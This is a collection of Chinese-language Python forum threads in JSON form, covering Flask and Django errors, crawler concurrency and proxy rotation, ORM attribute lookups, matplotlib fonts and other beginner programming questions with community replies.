{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一有错误、异常进程就直接结束了， try 了也不行。\n用别的 server 可以保证不退出吗</p>\n</div></div>"], "reply": "13", "tittle": "flask 用 app.run 这种方式启动，有异常特别容易退出，如何解决？", "comment": ["有异常退出不好吗？\r", "可以用 upstart/systemd 啊", "你说的开发环境吧，看看部署环境是如何使用的 ", "app.run 是用来调试的....线上部署别用这个", "为啥我用过 app.run 之后 sys.exit 都退不出去，貌似没啥 error 比 sys.exit 更 nb 了吧", "部署用 uwsgi", " 关键我 try 了，按我的理解应该 try 住\r", " 嗯  自己调试的时候\r", " MySQL 连不上就挂了", " 你有开启 thread=true 么", "部署用 Gunicorn+Supervisor", "有异常就退出是为了测试使用  gunicorn 欢迎你", " 有 try 没 except 或 Error Type 不对？", " 没开启，意思是现在是单线程，有异常就挂？\r", " \r", " 😂Windows 还没有 gunicorn  说是 20 才支持 Windows?\r", " except 的 exception  够大了吧", " 貌似是的，开启 thread=true 之后，只能用 os._exit 才能退的出去，用 sys.exit 都打不断程序", "开发环境下可以用： ", "\r", "线上部署请用 Gunicorn"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://model.py\" rel=\"nofollow\">model.py</a></p>\n<pre><code>class Category(models.Model):\nname = models.CharField(u'文章分类', max_length=64)\n\ndef __str__(self):\n    return self.name\n\n\nclass article(models.Model):\n    title = models.CharField(u'标题', max_length=60)\n    category = models.ManyToManyField('Category', verbose_name=u'分类', blank=True)\n    createtime = models.DateTimeField(u'createtime', default=timezone.now)\n    content = models.TextField(u'内容', blank=True, null=True)\n</code></pre>\n<p>报错如下：</p>\n<pre><code> File \"C:\\Users\\lujunhong\\Desktop\\work\\venv\\lib\\site-packages\\django\\db\\models\\options.py\", line 614, in get_field\nraise FieldDoesNotExist('%s has no field named %r' % (self.object_name, field_name))\ndjango.core.exceptions.FieldDoesNotExist: Category has no field named '文章分类' \n</code></pre>\n<p>请问为什么会提示 没有这个字段呢</p>\n</div></div>"], "reply": "10", "tittle": "django migrate 报错", "comment": ["给你提个建议，写字段的时候最好都统一一下，写成\r", "关键字参数形式。把文章分类用 verbose_name = \"文章分类\" 这样写。", " 谢谢提醒，可是上面提出的问题是什么原因呢，明明增加了这个字段", " 你试试这样写：\r", "name = models.CharField(verbose_name = u'文章分类', max_length=64)\r", "估计你直接用位置参数，没用对位置。", "category = models.ManyToManyField('category'...)\r", "这里，去掉引号。", "ManyToManyField 第一个参数是 Model class", "试过了，没有问题\r", "```\r", "class Category(models.Model):\r", "    name = models.CharField(u'文章分类', max_length=64)\r", "\r", "    def __str__(self):\r", "        return self.name\r", "\r", "\r", "class article(models.Model):\r", "    title = models.CharField(u'标题', max_length=60)\r", "    category = models.ManyToManyField('Category', verbose_name=u'分类', blank=True)\r", "    createtime = models.DateTimeField(u'createtime', default=timezone.now)\r", "    content = models.TextField(u'内容', blank=True, null=True)\r", "```\r", "```\r", "➜  temp python manage.py makemigrations\r", "Migrations for 'core':\r", "  core/migrations/0001_initial.py:\r", "    - Create model article\r", "    - Create model Category\r", "    - Add field category to article\r", "➜  temp python manage.py migrate\r", "Operations to perform:\r", "  Apply all migrations: admin, auth, contenttypes, core, sessions\r", "Running migrations:\r", "  Applying contenttypes.0001_initial... OK\r", "  Applying auth.0001_initial... OK\r", "  Applying admin.0001_initial... OK\r", "  Applying admin.0002_logentry_remove_auto_add... OK\r", "  Applying contenttypes.0002_remove_content_type_name... OK\r", "  Applying auth.0002_alter_permission_name_max_length... OK\r", "  Applying auth.0003_alter_user_email_max_length... OK\r", "  Applying auth.0004_alter_user_username_opts... OK\r", "  Applying auth.0005_alter_user_last_login_null... OK\r", "  Applying auth.0006_require_contenttypes_0002... OK\r", "  Applying auth.0007_alter_validators_add_error_messages... OK\r", "  Applying auth.0008_alter_user_username_max_length... OK\r", "  Applying core.0001_initial... OK\r", "  Applying sessions.0001_initial... OK\r", "➜  temp\r", "```", "Category 这个类是我后面加上去的 不知道有没有影响", " 每次修改 /增加 Model 后，都要先`python manage.py makemigrations`生成 migration 文件，然后`python manage.py migrate`应用到数据库。", " 谢谢啊  这个试用了一样的，最后我把 migrations 文件里内容删了，又把数据库清空，再生成就 OK 了  \r", "最原始的办法", "之前我遇到类似的问题，是用:    \r", "python manage.py migrate --fake appname"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h4>优化网络：</h4>\n<p>1.我理解 爬虫主要的问题在于网络阻塞，所以使用多线程弥补 HTTP 异步等待。\n那么使用了<code>gevent</code>解决网络问阻塞题，就不需要使用多线程吗？</p>\n<h4>优化 CPU ：</h4>\n<p>2.python 多线程运行时，使用的是单核心，还是多核心？<code>在多核心机器上运行</code>如果是单核心，能否同时使用<code>多线程</code>与<code>多进程</code>？</p>\n<p>3.在 4 核心 8 线程的电脑上，开启单个进程 32 线程 python 运行，这些线程是怎么分配的？</p>\n<p>4.当网络阻塞不是瓶颈，如何才能最大化使用单台电脑 CPU ？应该使用多线程还是多进程增大爬取速率？</p>\n<p>5.使用消息队列分布式爬虫，等待的消息过多会不会存在内存或 CPU 问题？</p>\n<p>6.使用消息队列是如何增大爬取速率的？</p>\n</div></div>"], "reply": "12", "tittle": "关于 python 爬虫速率的疑问", "comment": ["首先，从来没有任何框架真正解决了网络阻塞问题， gevent 和 twisted 之类的异步是变相的网络多线程，理论上你可以一直异步一直等待，但你的连接数会达到无限大，在这之前连接就被服务器干掉了。\r", "在这个前提下，异步也只能在一个限定的连接数之下充分发挥你最大的带宽而已，网络依然是阻塞的。", "感觉你考虑太多了，爬虫的限制一般都来自目标网站", "花大把时间搞定之后, 一个 captcha 傻眼了", "你可以试试 pypy ，我觉得足够了= =", "1. 不需要\r", "2. 单核，启动多个进程\r", "3. 随机使用一个核\r", "4. 多进程\r", "5. 会\r", "6. 使用消息队列不会增大爬取速率", "真的不担心把目标网站爬挂吗？", "真正的瓶颈来源于目标网站的反爬虫策略", "瓶颈在 IO ，也就是网络上，包括目标网站的响应速度、网络状况、本地网络等。这个响应速度实际情况下至少也是 10ms 以上的，而你 CPU 处理这个页面速度怎么也在 0.01ms 以下吧(除非你里面又放了什么 IO 操作)；所以你看这个速度差距在 1000 倍以上；你唯一要考虑的是目标网站把你当 DOS 攻击把你屏蔽了(有各种屏蔽方式)。如果对方真允许你这么快，你也的确需要这么快，那么多开几个进程吧；注意不要重复爬就是了。\r", "分布式爬虫什么的不是爬单个简单目标，而是爬很多目标的情况下使用的，这个是集群情况下使用，单机就不用了吧。\r", "\r", "另外楼主的问题其实不是关于爬虫的，而是计算机 /软件基础知识不清楚，建议补补这些吧。", " 233333", "python 的多线程本身就不稳定,我一般是把程序写成单线程,但启动多个进程来跑,非常稳定", "1L 已经回答了", " 有时候要半路停下来就挺恶心了，要 awk 然后 xargs kill 。一个脚本里多个进程，杀起来就比较容易。。"]},
{"content": ["<div class=\"topic_content\"># lz 最近看廖雪峰的 python3 教程实战， 写代码时遇到一个问题， 此为背景\r<br>暂时只贴部分代码，其余部分代码放在 github 上：\r<br><a target=\"_blank\" href=\"https://github.com/hfutcbl/python-liaoxuefeng_practice/tree/master/aiohttpPractice\" rel=\"nofollow\">https://github.com/hfutcbl/python-liaoxuefeng_practice/tree/master/aiohttpPractice</a>\r<br>\r<br>python 版本：\r<br>python3 --version\r<br>Python 3.5.2\r<br>\r<br>代码：\r<br>类的代码\r<br>class User(Model):\r<br>    __table__ = 'users'\r<br>\r<br>    id = StringField(primary_key=True, default=next_id, ddl='varchar(50)')\r<br>    email = StringField(ddl='varchar(50)')\r<br>    passwd = StringField(ddl='varchar(50)')\r<br>    admin = BooleanField()\r<br>    name = StringField(ddl='varchar(50)')\r<br>    image = StringField(ddl='varchar(500)')\r<br>    created_at = FloatField(default=time.time)\r<br>调用代码\r<br>u = User(name='Test1', <a target=\"_blank\" href=\"mailto:email='test1@example.com\">email='test1@example.com</a>', passwd='1234567890', image='about:blank')\r<br>......\r<br>def getValueOrDefault(self, key):\r<br>print('email:%s, passwd:%s, name:%s, image:%s' % (self['email'], self['passwd'], self['name'], self['image']))\r<br>print(self.email, self.passwd, self.name, self.image, '\\n','self:', self)\r<br>\r<br>结果：\r<br>email:test1@example.com, passwd:1234567890, name:Test1, image:about:blank\r<br><a target=\"_blank\" href=\"mailto:test1@example.com\">test1@example.com</a> &lt;StringField, varchar(50):None&gt; &lt;StringField, varchar(50):None&gt; &lt;StringField, varchar(500):None&gt; \r<br> self: {'email': '<a target=\"_blank\" href=\"mailto:test1@example.com\">test1@example.com</a>', 'name': 'Test1', 'image': 'about:blank', 'passwd': '1234567890'}\r<br>\r<br>用 self[key] 访问可以正常获取数据，但用 self.key 只能获得传入的 4 个参数中的其中一个正确数据，比如这次是 email ，每次运行能够获取正确数据的 key 值不一样，运行多次亲测：\r<br>email:test1@example.com, passwd:1234567890, name:Test1, image:about:blank\r<br>&lt;StringField, varchar(50):None&gt; 1234567890 &lt;StringField, varchar(50):None&gt; &lt;StringField, varchar(500):None&gt; \r<br> self: {'passwd': '1234567890', 'email': '<a target=\"_blank\" href=\"mailto:test1@example.com\">test1@example.com</a>', 'image': 'about:blank', 'name': 'Test1'}\r<br>\r<br>有知道的大神能解答下吗？</div>"], "reply": "10", "tittle": "新人求助， 为什么实例属性没有覆盖类属性", "comment": ["自顶一记\r", "没人不开心", "不看你的代码，就看你的标题。\r", "实例属性的查询方式是：先查询实例的属性，如果没有查询到，才会向类里查询相应的属性。\r", "我是小白，可能说的不严谨。\r", "这个知识点我是在博客园里，有一篇专门讲类与实例属性继承的文章里学习到的", "这代码格式没法看啊", "问题抽象了，同时把代码也抽象一下吧。。。", "  是啊 print(self)可以看到实例的属性是我初始化实例的数据 但是用 self.key 访问到的确实类的属性\r", "  v 站貌似不支持 markdown\r", " \r", "\r", "好吧，把问题抽象一下。\r", "简单的说就是我想获取 self 的属性， 用 self[key]能够正常获取我传入的数据， self.key 会出现异常（会返回类的 key 属性 default 值）， print(self)显示实例的 key 值对应的是我传入的数据， 所以有疑惑。 想知道 self[key]和 self.key 的区别，为什么返回的结果不一样。", "self.key 是标准获得实例属性的 python 语法。除非实例里面没有，才会去读类级别变量。至于 self[key]为什么可以，那个是 Django 框架设计的，不是 python 语法", "  感谢解答。\r", "尴尬的是我用的不是 Django 框架， 前面没说清楚， 我是让类 User 是继承 dict 类， 所以 self[key]的方式是可以的。\r", "而且 print(self)打印出来的就是一个 dict ：\r", "self: {'email': '", "', 'name': 'Test1', 'image': 'about:blank', 'passwd': '1234567890'}", "\r", "检查一下 orm.py 里对于 Model 类的构造：\r", "\r", "class Model(dict, metaclass=ModelMetaclass):\r", "\r", "    def __init__(self, **kw):\r", "        super(Model, self).__init__(**kw)\r", "\r", "相当于调用的 dict 的构造， dict 的构造里没有将 key 直接转为 instance property 的默认行为吧？不过 ModelMetaclass 的__new__ 里可以处理吧。\r", "另外，一般习惯上，对于这样使用 orm 的，用 instance[key] 的方式比较普遍吧。", " \r", "非常感谢回答， 终于明白 self.key 为什么不行了。在 ModelMetaclass 的 __new__函数里没有确实没有将 key 处理为 instance property 。\r", "但是还是有个问题：并不是所有 self.key 打印出来的值都是类中定义的 default 值，见输出：\r", "\r", " <StringField, varchar(50):None> <StringField, varchar(50):None> <StringField, varchar(500):None>\r", "\r", "还有个问题：\r", " 最初我是用      getattr(self, key, None)      来获取属性， \r", "class Model:\r", "......\r", "    def __getattr__(self, key):\r", "          try:\r", "              return self[key]\r", "              print('-------\\n getattr() called \\n-------------')\r", "              ......\r", "发现 getattr 每次运行只被调用一次（我期待调用次数和 key 的个数一样），想知道 getattr 的调用顺序。\r", "谢谢各位大神。", "__getattr__(self, name)\r", "Called only when an attempt to retrieve the named attribute fails, after the obj,\r", "Class and its superclasses are searched. The expressions obj.no_such_attr, get\r", "attr(obj, 'no_such_attr') and hasattr(obj, 'no_such_attr') may trigger\r", "Class.__getattr__(obj, 'no_such_attr'), but only if an attribute by that name\r", "cannot be found in obj or in Class and its superclasses."]},
{"content": ["<div class=\"topic_content\">加入了期间结束的市值，并把行情改为复权后的涨幅，更加正确。\r<br>自己研究主题投资历史用的，简单方便，代码效率还可以。\r<br>主题名称可以输入想要的，日期也可选择。\r<br>×\r<br>\r<br>import pandas as pd\r<br>import numpy as np\r<br>bdt=\"20160311\" #期间开始\r<br>edt=\"20161011\" #期间结束\r<br>\r<br>\r<br>themeName =u'锂电池'   \r<br>#获取某主题相关股票的信息\r<br>ztid=DataAPI.TickersByThemesGet(themeID=u\"\",themeName=themeName,beginDate=u\"\",endDate=u\"\",isNew=u\"\",field=u\"\",pandas=\"1\")\r<br>gpjc=ztid.secShortName.tolist() #股票简称\r<br>stocklist=ztid.secID.tolist() #股票代码\r<br>returnall=[] #设立收益列表\r<br>mrktval1=[]\r<br>mrktval2=[]\r<br>ysdf=pd.DataFrame()\r<br>#print(stocklist)\r<br>#获取股票 list 中的各股票收益并装入 returnall 中\r<br>for i in stocklist:\r<br>    price1=DataAPI.MktEqudAdjGet(secID=i,\\\r<br>                             beginDate=bdt,endDate=bdt,field=u\"secID,closePrice\",pandas=\"1\")#期间开始价格\r<br>    price2=DataAPI.MktEqudAdjGet(secID=i,\\\r<br>                             beginDate=edt,endDate=edt,field=u\"secID,closePrice,negMarketValue,marketValue\",pandas=\"1\")#期间结束价格\r<br>    returnget=round(float(price2.closePrice[0]\r<br>1\r<br>import pandas as pd\r<br>2\r<br>import numpy as np\r<br>3\r<br>bdt=\"20160311\" #期间开始\r<br>4\r<br>edt=\"20161011\" #期间结束\r<br>5\r<br>​\r<br>6\r<br>​\r<br>7\r<br>themeName =u'锂电池'   \r<br>8\r<br>#获取某主题相关股票的信息\r<br>9\r<br>ztid=DataAPI.TickersByThemesGet(themeID=u\"\",themeName=themeName,beginDate=u\"\",endDate=u\"\",isNew=u\"\",field=u\"\",pandas=\"1\")\r<br>10\r<br>gpjc=ztid.secShortName.tolist() #股票简称\r<br>11\r<br>stocklist=ztid.secID.tolist() #股票代码\r<br>12\r<br>returnall=[] #设立收益列表\r<br>13\r<br>mrktval1=[]\r<br>14\r<br>mrktval2=[]\r<br>15\r<br>ysdf=pd.DataFrame()\r<br>16\r<br>#print(stocklist)\r<br>17\r<br>#获取股票 list 中的各股票收益并装入 returnall 中\r<br>18\r<br>for i in stocklist:\r<br>19\r<br>    price1=DataAPI.MktEqudAdjGet(secID=i,\\\r<br>20\r<br>                             beginDate=bdt,endDate=bdt,field=u\"secID,closePrice\",pandas=\"1\")#期间开始价格\r<br>21\r<br>    price2=DataAPI.MktEqudAdjGet(secID=i,\\\r<br>22\r<br>                             beginDate=edt,endDate=edt,field=u\"secID,closePrice,negMarketValue,marketValue\",pandas=\"1\")#期间结束价格\r<br>23\r<br>    returnget=round(float(price2.closePrice[0]/price1.closePrice[0]-1),4)#收益，保留四位小数\r<br>24\r<br>    returnget1=str(returnget*100)+'%'\r<br>25\r<br>    returnall.append(returnget1)\r<br>26\r<br>    mrktval1.append(int(price2.negMarketValue/100000000))\r<br>27\r<br>    mrktval2.append(int(price2.marketValue/100000000))\r<br>28\r<br>#print mrktval1\r<br>29\r<br>indexlen=len(stocklist)+1#为了设置 Index\r<br>30\r<br>alltable=pd.DataFrame(np.array(zip(stocklist,gpjc,returnall)),columns=['代码','股票简称','期间涨幅'])#index=list(range(1,indexlen))\r<br>31\r<br>​\r<br>32\r<br>alltable1=alltable.join(pd.Series(mrktval1,name='流动市值'))\r<br>33\r<br>alltable2=alltable1.join(pd.Series(mrktval2,name='总市值'))\r<br>34\r<br>​\r<br>35\r<br>​\r<br>36\r<br>alltable2\r<br>\r<br>详细代码和回测结果： <a target=\"_blank\" href=\"https://uqer.io/community/share/57fce2b0228e5b3668facaf0?source=home\" rel=\"nofollow\">https://uqer.io/community/share/57fce2b0228e5b3668facaf0?source=home</a></div>"], "reply": "1", "tittle": "计算一段时期内，某个主题相关个股的涨幅——利用 Python 构建", "comment": ["回顾历史的意义是啥"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我只知道以前的 django 版本是用 python <a href=\"http://manage.py\" rel=\"nofollow\">manage.py</a> sqlall appname\n现在没有 sqlall 指令了，就像 migrate 代替了 syscdb 。所以 sqlall 对应 django 1.9 的什么啊</p>\n</div></div>"], "reply": "4", "tittle": "Django 用 model 生成 sql 语句怎么查看", "comment": ["类似的功能： ", " 谢谢了", "python manage.py sqlmigrate appName\r", "不知道你是不是想问的这个", " 已经解决了，但还是谢谢"]},
{"content": ["<div class=\"topic_content\">这个文件里可以写代码吗？\r<br>看 flask 的文档，把 views 拆出来，在 __init__.py 里面 app = Flask(__name__)\r<br>\r<br>然后我直接在 __init__.py 里用 main app.run()，结果都是 404.\r<br>但是如果放到别的文件里， import app ，再 run 就可以。</div>"], "reply": "7", "tittle": "__init__.py 除了 包的作用，还有什么？", "comment": ["可以写代码呀，在 import 包的时候就执行了", " 里面的代码会在 import 的时候执行？\r", "为啥里面运行 APP.run 不行呢", "__all__", "主要是 export 用，比如我写一个模块 example ，在其__init__.py 里导出一些对象，比如 session\r", "不管内部还是外部，要获取 session ，都直接 `from example import session` 就好了。", " \r", " 嗯  其实我想问 为啥在里面运行 APP.run 全是 404", "贴代码。你这样问没人答得出来。", "建议你看下 python 的库源码，看看别人怎么用__init__"]},
{"content": ["<div class=\"topic_content\">现有一个 word 文件，里面有 200 个单词（一个单词一行），如果想随机分 18 组，每组 50 个，再输出到 word 里，可以用 python 实现吗？\r<br>\r<br>具体该用什么实现？</div>"], "reply": "3", "tittle": "如何将一个 word 里的几百个单词随机分组", "comment": ["shuffle", "直接命令行操作如何？\r", "$ split -l 50 abc.txt\r", "\r", "或者先简单乱序，再 split ?\r", "while read i; do echo \"$i $RANDOM\"; done< abc.txt | sort -k2n | cut -d\" \" -f1", "random.shuffle(words)"]},
{"content": ["<div class=\"topic_content\">请教大家一个问题，困扰我好几天了，:)\r<br>matplotlib 中文显示不出来，修改了 matplotlibrc 文件，将字体改成了宋体。修改后生成的图片，中文和英文都是宋体，这样就很不美观，能够设置中文为宋体，英文为 Times New Roman 呢？\r<br>有没有参考的思路呢？</div>"], "reply": "4", "tittle": "matplotlib 如何解决中英混排", "comment": ["这样的?\r", "\r", "\r", "# -*- coding: utf-8 -*-\r", "import matplotlib.pyplot as plt\r", "from matplotlib.font_manager import FontProperties\r", "\r", "song_ti = FontProperties(fname=r'C:\\Windows\\Fonts\\simsun.ttc', size=20)\r", "times_new_roman = FontProperties(fname=r'C:\\Windows\\Fonts\\times.ttf', size=15)\r", "ax = plt.gca()\r", "ax.set_title(u'能量随时间的变化', fontproperties=song_ti)\r", "ax.set_xlabel('Time (s)', fontproperties=times_new_roman)\r", "ax.set_ylabel('Energy (J)', fontproperties=times_new_roman)\r", "plt.show()", " 如何得到 fonts 对应的文件名呢？ simusun.ttc 在 fonts 文件夹下看不到\r", "网上搜索了一下，请问用 python 能实现么？", "C:\\Windows\\Fonts 文件夹下右键看属性， 没有属性的是字体系列， 双击打开它看里面每个字体文件的属性， 里面有该字体的名字。", " 网上搜的结果，全部没有这个方法方便，谢谢啦:)"]},
{"content": ["<div class=\"topic_content\">没研究过 python,数据采集都是用 php 的 curl 。感觉也是很强大的，不知道 python 数据采集相比有什么特点？</div>"], "reply": "3", "tittle": "谁能说说 python 和 php 数据采集方面的各自特点吗？", "comment": ["py 轮子多，用的人更多\r", "php 的 web 相关库更强大，内容处理更方便吧", "php 适合小规模小难度采集。 python 更容易以较少的资源和较高的并发实现大规模数据采集", "会啥用啥\r", "数据采集无非是一个 http client 和一个 html parser\r", "php 的 http client 有 php-curl-class, requests, httpful, buzz 和强大的 guzzle 大多都支持 multi curl 的多线程\r", "html 解析可以用 symfony 的 dom crawler 和轻量小巧的 didom"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>编写一个程序, 在一个文本文件中查找长度大于 80 个字符的文本行.\n从最接近 80 个字符的单词断行, 把剩余文件插入到下一行处.\n程序执行完毕后, 应该没有超过 80 个字符的文本行了</p>\n</div></div>"], "reply": "13", "tittle": "大家帮忙看一道 python 题目，给个答案 谢谢！", "comment": ["整个用空格连起来重新排", "```\r", "line = '12345 ' * 20  #\r", "\r", "i,j = 0,0\r", "while i < 80:\r", "    j = i\r", "    i = line.find(' ',j + 1)\r", "print(line[:j])\r", "```\r", "\r", "从最接近 80 个字符的单词断行", "这样子格式化小心炸了", "import random\r", "line='1'\r", "for a in range(100):\r", "    line='{}  {}'.format(line,'1' * random.randint(0,10))\r", "#print(line)\r", "\r", "line_list=[]\r", "a=80\r", "while True:\r", "    if len(line) <= 80:\r", "        line_list.append(line)\r", "        break\r", "    if line[a] != ' ':\r", "        a-=1\r", "    else:\r", "        line_list.append(line[:a])\r", "        while line[a] == ' ':a+=1\r", "        line=line[a:]\r", "        a=80\r", "\r", "for line in line_list:\r", "    print('{},len={}'.format(line,len(line)))\r", "\r", "#从最接近 80 个字符的单词断行\r", "#程序执行完毕后, 应该没有超过 80 个字符的文本行了", "哎呀，发出去就格式乱了，你凑合看吧", " thx", " thx", " thx", "从 str[80]开始向前找空格，找到以后切下来扔出去就行了。", "看看 Python 的标准库 textwrap", " thx 有库就简单多了～", "啊……这明明就是一个编辑器该干的事， gedit 设置，两分钟估计就解决了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>暂时知道的有能让形参补全的方法就是</p>\n<pre><code>def my_fun(x:int,y:int):\n\tz = 1\n    return z\n</code></pre>\n<p>可是这样只能自动识别形参，函数内部的临时变量如 z 却不能自动补全，这对于要使用大型库的 Coder 来说很容易出错啊。。</p>\n</div></div>"], "reply": "10", "tittle": "python 让 ide（如 Pycharm） 在函数内部能自动补全变量的方法有哪些？", "comment": ["函数内部的临时变量为什么要进行自动补全呢......这个东西不是应该不暴露出来的吗?", " 可是写那些新的大库的工作流的函数。。难道都是用 ipython 这样写出来的吗", "没看懂要干嘛， z 的话应该已经识别类型的了", "Scala 大法好", "编译型思路写脚本语言。一般通过 docstrings 说明", "写了 python 才知道为啥脚本语言要经常百度 Google 查函数", "def my_fun(x, y):\r", "\"\"\"\r", ":type x: int\r", ":type y: int\r", "\"\"\"\r", "\tz = 1\r", "        \"\"\"\r", "        :type z: int\r", "        \"\"\"\r", "    return z", "def my_fun(x, y): \r", "\"\"\" \r", ":type x: int \r", ":type y: int \r", "\"\"\" \r", "z = 1 #type: int\r", "return z\r", "\r", "Pycharm 应该是有效的", " 这个算是用到了 pydoc 功能吧？", "```python\r", "assert isinstance(x, SomeClass)\r", "x.abcd # 这里有智能提示\r", "```\r", "\r", "在首次定义的时候加一句 assert 可以让 PyCharm 识别类型。"]},
{"content": ["<div class=\"topic_content\">&lt;li {% if show_followed %} class=\"active\"{% endif %}&gt;\r<br>在 cookie 里面 show_followed 值为 1 ，然后用{% if show_followed %}可以获取 cookie 值，但是在实际上用的时候我没有获取到这个 show_followed 的值，这是为什么呢？求解，在 flask web 开发一书中是可以的。</div>"], "reply": "1", "tittle": "flask 模版上获取 cookie 值", "comment": ["已知道"]},
{"content": ["<div class=\"topic_content\">我是一名大二的学生，大学开展了 python 课程后发现自己对 python web 比较感兴趣，然后自主学习了 django 框架。目前学习内容比较基础:\r<br>1.能用 requests ＋ beautifulsoup 做爬虫并用 django 展示\r<br>2.能用 django 做简单的个人项目(基本 view,models 加上 get,post 请求那种。。。)\r<br>\r<br>然后目前学习上有点止步不前了，想请教 v 友前辈们:\r<br>1.接下来学习的内容和方向\r<br>2.能否推荐一点进阶的已完成 django 项目(我自己认为能从项目里学到很多实用的知识。。)\r<br>\r<br>最后衷心感谢提供帮助的前辈们！</div>"], "reply": "2", "tittle": "请教 django 学习问题！", "comment": ["1. 看插件源码 ", "\r", "\r", "2. ", " 感谢！！！第一次看这样的东西，感觉信息量有点大，有点不知如何入手"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://blog.csdn.net/u011659379/article/details/53020704\" rel=\"nofollow\">http://blog.csdn.net/u011659379/article/details/53020704</a>\n一篇很尴尬的帖子</p>\n</div></div>"], "reply": "10", "tittle": "知乎验证码升级了？", "comment": ["再次模拟登录的时候，验证码又成为正常的 4 字验证码了~~~乖乖，吓坏了。。\r", "文章中的变态验证码是我多次退出登录后才有的，，，", "..带着 cookie 访问吧", "要及时按暂停....还加粗了 @.@", "我昨天登录一个很久不用的账户也遇到了", "<img src=\"", " \" />", " 哈哈哈，用浏览器的开发者工具不及时暂停的话，就跳转页面了，一跳转页面那就清空了原有页面的 Network 信息", "为什么还要即时按暂停，考验手速的时候么。。开着 Preserve log 不就可以了么~", " 怪我咯。。不过想想用 firefox 的 httpfox 插件的话会好很多", "\r", " \r", "\r", "不暂停也没关系吧。。。只要 preserve log", " \r", " \r", "无奈~~~没有仔细研究过这个，学习了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>要如何在 terminal 的环境下添加自定目录？</p>\n<p>试着在 <code>.profile</code> 文件里面添加</p>\n<pre><code>PYTHONPATH=\"/Users/xxxx/xxxx:$PYTHONPATH\"\nexport PYTHONPATH\n</code></pre>\n<p>发现在 sublime text 里面可以正常运行，但在 terminal 下就报错 <code>ImportError: No module named xxx</code></p>\n<p>最新版 mac ， python2.7</p>\n</div></div>"], "reply": "5", "tittle": "关于 python 在 mac 下自定义模块目录的问题", "comment": ["import sys\r", "sys.path.append(\"path2module\")", "干嘛不把他打包，到处可以用\r", "写个 setup.py\r", "pip install -e .", " \r", "这个确实可以解决问题，但感觉不太优雅啊。。\r", "\r", " \r", "因为导入的那个 py 文件也一直在改变", "就是 2 楼说的方法， e 指定了是用开发者模式安装，会直接用源文件的", "原来如此，谢了"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://mp.weixin.qq.com/s?__biz=MzAwODczNTEyNQ==&amp;mid=2649271632&amp;idx=1&amp;sn=218b7f0b7a7046815c3c181abdddad3e&amp;chksm=83765daab401d4bcc69472e431e1084e957ca448219d454ba55b637e7062292b68a1c0d21d24#rd\" rel=\"nofollow\">http://mp.weixin.qq.com/s?__biz=MzAwODczNTEyNQ==&amp;mid=2649271632&amp;idx=1&amp;sn=218b7f0b7a7046815c3c181abdddad3e&amp;chksm=83765daab401d4bcc69472e431e1084e957ca448219d454ba55b637e7062292b68a1c0d21d24#rd</a></div>"], "reply": "目前尚无回", "tittle": "说说 Python 多线程中的 daemon 属性方法", "comment": []},
{"content": "", "reply": "3", "tittle": "野生程序员，想要深入学习下 pyqt4，希望大大们给发几个中小型项目源码~谢谢", "comment": ["我也想知道现在是玩玩 qt5 呢还是 qt4 呢", "Qt4 该退出历史舞台了\r", "\r", "PyQt5 有一个看起来还算合适的项目， retext", " 这两个好像没啥区别吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>dict 大家都知道,然后我想通过 dict.a 这样访问他的 key.想法很美好,但是实现上都很蹩脚,比如 dict.items 到底算是属性呢还是算方法呢?</p>\n<p>所以我就改写了一下用法是这样的</p>\n<pre><code>   arg_post = LazeAttrDict(\n        {'a': 2, 'keys': 'kk'},\n        {\n            'a': {\n                'access': str\n            },\n            'b': {\n                'default': 'default',\n            },\n            'items': {\n                'default': [1, 2]\n            },\n            'values': {\n                'default': 'vvv'\n            }\n\n        })\n    assert arg_post.a == \"2\"\n    assert arg_post.b == \"default\"\n    assert arg_post.items == [1, 2]\n    assert arg_post.values == \"vvv\"\n\n    # 访问 dict 方法\n    print(\"items 方法\")\n    for k, v in arg_post._items():\n        print('\\t', k, v)\n\n    print(\"keys 方法\")\n    print(\"\\t\", list(arg_post._keys()))\n    d = dict(**arg_post)\n    print(\"dict 方法\\n\\t\", d)\n\n    print(\"唯一的 bug\")\n    print(arg_post.keys)\n</code></pre>\n<p>结果</p>\n<pre><code>items 方法\n\t keys kk\n\t a 2\n\t values vvv\n\t b default\n\t items [1, 2]\nkeys 方法\n\t ['keys', 'a', 'values', 'b', 'items']\ndict 方法\n\t {'keys': 'kk', 'b': 'default', 'a': '2', 'items': [1, 2], 'values': 'vvv'}\n唯一的 bug\n&lt;bound method Mapping.keys of &lt;__main__.LazeAttrDict object at 0x101c05c50&gt;&gt;\n</code></pre>\n<p>这个 dict 类第二个参数是用来自动校验参数的,有默认值,和转化类型两种方式.</p>\n<p>要是 keys 那个方法也可以干掉就太完美了.</p>\n</div></div>"], "reply": "1", "tittle": "比较满意的 attrdict 实现", "comment": ["通过调用站找到是否是**调用 dict,然后把 keys 给干掉了...总觉得会有 bug.\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看论坛里有人提到代理池，准备自己在 pyspider 上实现。有没有付费的代理池服务？</p>\n</div></div>"], "reply": "8", "tittle": "请问代理池配合 python 爬虫是怎么实现的？什么 lib 能实现切换代理 IP？", "comment": ["linux 装上 Tor 服务，然后使用 stem 自动切换即可", " 谢谢 我原以为买几十个代理 ip 然后滚动更换", " 买 ip 是最好用的方法，速度快，缺点是太贵了。 tor 虽然不要钱但是卡得很", "\r", "\r", " 感谢老大 希望您持续更新 code 和 docker", "我在 vultr 日本节点 tor 抓 play store 的数据，是有些慢", "用 socks5 得比较多把，去买点吧，或者去快代理买。这种代理一大堆黑产用", "squid"]},
